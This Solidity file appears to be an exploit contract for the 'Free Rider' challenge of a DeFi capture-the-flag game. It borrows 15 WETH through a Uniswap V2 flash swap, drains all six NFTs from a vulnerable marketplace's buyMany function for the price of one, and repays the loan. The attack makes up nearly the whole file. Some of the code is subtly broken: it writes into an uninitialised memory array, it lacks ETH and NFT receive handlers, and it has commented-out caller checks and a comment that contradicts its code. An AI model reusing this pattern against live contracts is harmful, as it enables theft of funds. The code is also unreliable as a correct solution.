// SPDX-License-Identifier: MIT

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

import "../free-rider/FreeRiderNFTMarketplace.sol";

pragma solidity ^0.8.0;

contract AttackFR is IUniswapV2Callee {
    using Address for address;

    IUniswapV2Pair uniswapPair; //stores DVT to WETH (as only these 2 tokens are present in liquidity of the pool)
    //token0 = DVT
    //token1 = WETH
    IERC20 dvtToken;
    address wethTokenAddress;
    IUniswapV2Factory uniswapFactory;
    ERC721 dvNftToken;
    address buyerAddress;
    FreeRiderNFTMarketplace nftMarketplace;
    uint dvtReturnAmount;

    constructor(
        address addr1,
        address addr2,
        address payable addr3,
        address addr4,
        address addr5,
        address addr6,
        address payable addr7
    ) {
        uniswapPair = IUniswapV2Pair(addr1);
        dvtToken = IERC20(addr2);
        wethTokenAddress = addr3;
        uniswapFactory = IUniswapV2Factory(addr4);
        dvNftToken = ERC721(addr5);
        buyerAddress = addr6;
        nftMarketplace = FreeRiderNFTMarketplace(addr7);
    }

    //this contract will own the flash loan so we dont need to call connect(attacker)
    function attack() public {
        uint amount0out = 0;
        uint amount1out = 15 ether;
        address to = address(this);
        bytes memory data; //data will store loan specific data.

        //prepare the "data" values.
        data = abi.encode(wethTokenAddress, amount1out);

        //this will call uniswapV2Call which is not defined, this is what will repay loan, hence we need to defin this in loan borrower contract.
        uniswapPair.swap(amount0out, amount1out, to, data);
    }

    // Flash Swap callback from UniSwap
    //this will be called by uniswapPair() contract's swap function, hence msg.sender = uniswapPari()
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        //// we need the below to standardize the function
        // address token0 = IUniswapV2Pair(msg.sender).token0();
        // address token1 = IUniswapV2Pair(msg.sender).token1();
        // address pair = IUniswapV2Factory(factory).getPair(token0, token1);

        // // Ensure the pair contract is the same as the sender
        // // and this contract was the one that initiated it.
        // require(msg.sender == pair, "!pair");
        // require(sender == address(this), "!sender");

        // DVT -> <- WETH
        address token0 = address(dvtToken);
        address token1 = wethTokenAddress;

        // Decode custom data set in flashLoan()
        (address tokenBorrow, uint256 amount) = abi.decode(
            data,
            (address, uint256)
        );

        // Calculate Loan repayment in WETH.
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        // convert all WETH to ETH
        uint256 currBal = IERC20(tokenBorrow).balanceOf(address(this)); //because we borrowed the loan, we now have 15 WETH.
        //we are calling like this because we do not have its ABI imported.
        //functionCall is a special function from Address.sol

        tokenBorrow.functionCall(
            abi.encodeWithSignature("withdraw(uint256)", currBal)
        );

        // as we know the exact token IDs of the NFTs the martketplace owns.
        uint256[] memory tokenIds;
        for (uint i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        // Purchase all NFTs for the Price of 1
        //msg.value = 15, send from address(this)
        nftMarketplace.buyMany{value: 15 ether}(tokenIds);

        // Transfer newly attained NFTs to Buyer Contract
        for (uint256 i = 0; i < 6; i++) {
            // DamnValuableNFT(nft).safeTransferFrom(address(this), buyer, i);
            dvNftToken.transferFrom(address(this), buyerAddress, i); //as the current contract owns the NFT we dont need to use transferFrom
        }

        // Deposit ETH into WETH contract
        // ETH came from Buyer Contract + Marketplace exploit
        (bool success, ) = wethTokenAddress.call{value: 15.1 ether}("");
        require(success, "failed to deposit weth");

        // Pay back Loan with deposited WETH funds
        //tokenBorrow = wethToken
        IERC20(wethTokenAddress).transfer(address(uniswapPair), amountToRepay);
    }
}
